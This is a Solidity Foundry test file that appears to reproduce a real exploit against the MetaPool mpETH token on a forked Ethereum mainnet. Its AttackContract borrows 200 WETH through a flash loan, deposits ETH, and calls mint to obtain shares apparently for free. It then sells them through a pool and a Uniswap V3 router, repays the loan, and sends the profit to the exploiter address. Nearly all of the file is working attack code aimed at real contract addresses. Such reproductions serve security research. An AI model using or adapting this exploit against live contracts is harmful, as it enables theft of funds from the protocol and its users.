// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import {Test, console} from "forge-std/Test.sol";
type Currency is address;
interface ImpETH {
    function depositETH(address receiver) external payable returns (uint256);
    function mint(uint256 shares, address receiver) external;
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}
interface Ipool {
    function swapmpETHforETH(uint256 amount, uint256 minAmountOut) external;
}

struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
}
interface IRouter {
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256);
}
interface Ivault{
    function flashLoan(address recipient, address[] memory token, uint[] memory amount, bytes memory data) external;
}

interface IWETH {
    event Deposit(address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);

    receive() external payable;
    fallback() external payable;
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function owner() external view returns (address);
}
interface IuniV4{
    function unlock(bytes calldata data) external;
    function take(Currency currency, address to, uint256 amount) external;
    function sync(Currency currency) external;
    function settle() external payable;
}
interface IV3pool{
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
}

contract MetaPoolPoC is Test {
    address mpETH = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
    address exploiter =0x48f1d0F5831Eb6e544f8cBDe777b527b87a1BE98;
    address MEV_Yoink = 0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A;
    function setUp() public {
        vm.createSelectFork("mainnet", 22722911 - 1);
    }
    function testExploit() public  {
        vm.startPrank(exploiter);
        AttackContract att = new AttackContract();
        att.start();
        
        uint256 amount = ImpETH(mpETH).balanceOf(address(exploiter));
        console.log("mpETH balance: ", amount);
        vm.stopPrank();
    }
    receive() external payable {}
}

contract AttackContract {
    address vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    IWETH weth = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    ImpETH mpETH = ImpETH(0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710);
    Ipool pool = Ipool(0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc);
    IRouter v3Router = IRouter(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    address exploiter = 0x48f1d0F5831Eb6e544f8cBDe777b527b87a1BE98;
    function start() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 200 ether;
        Ivault(vault).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory data
    ) public {

        weth.withdraw(107 ether);
        uint256 amount = mpETH.depositETH{value: 107 ether}(address(this));
        mpETH.mint(amount, address(this));

        mpETH.approve(address(pool), type(uint256).max);
        pool.swapmpETHforETH(97 ether, 0);
        pool.swapmpETHforETH(9.6 ether, 0);

        mpETH.approve(address(v3Router), 1000000000 ether);
        ExactInputSingleParams memory param = ExactInputSingleParams({
            tokenIn: address(mpETH),
            tokenOut: address(weth),
            fee: 100,
            recipient: address(this),
            amountIn: 10 ether,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        v3Router.exactInputSingle(param);
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(vault), 200 ether);
        weth.withdraw(weth.balanceOf(address(this)));
        
        console.log("ETH balance: ", address(this).balance);
        exploiter.call{value: address(this).balance}("");
        mpETH.transfer(exploiter, ImpETH(mpETH).balanceOf(address(this)));
    }

    receive() external payable {}
}
